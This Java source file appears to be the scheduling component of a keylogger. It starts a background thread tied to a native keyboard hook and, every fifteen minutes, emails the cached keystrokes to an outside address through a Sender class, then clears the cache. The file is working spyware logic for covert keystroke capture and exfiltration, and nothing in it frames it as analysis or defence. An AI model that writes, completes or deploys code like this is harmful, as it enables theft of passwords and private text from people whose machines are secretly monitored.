package main.handlers;

import main.keys.NativeKeyboard;

public class ManageService implements Runnable{
    private NativeKeyboard keyboard;
    private Thread service;

    public ManageService(){
        keyboard = new NativeKeyboard();
        service = new Thread(this,"Manage Service");
        service.start();
    }

    public NativeKeyboard getKeyboard() {
        System.out.println("Start Recording ");
        return keyboard;
    }

    @Override
    public void run() {
    // Time set to start at beginning of Thread
   long start=System.nanoTime();

   while(true){
       long elapsed=(System.nanoTime()-start)/1_000_000;
       // Set to send records every 15minutes
       // for testing you can use 30_000 as 30seconds
       if(elapsed > 60_000 *15){
           try {
               System.out.println("Start Sending...");
               Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
               keyboard.onSend();
               System.out.println("Sent Correctly");
           } catch (Throwable e) {
               e.printStackTrace();
               keyboard.onFail();
           }
           start=System.nanoTime();
       }
   }
    }
}
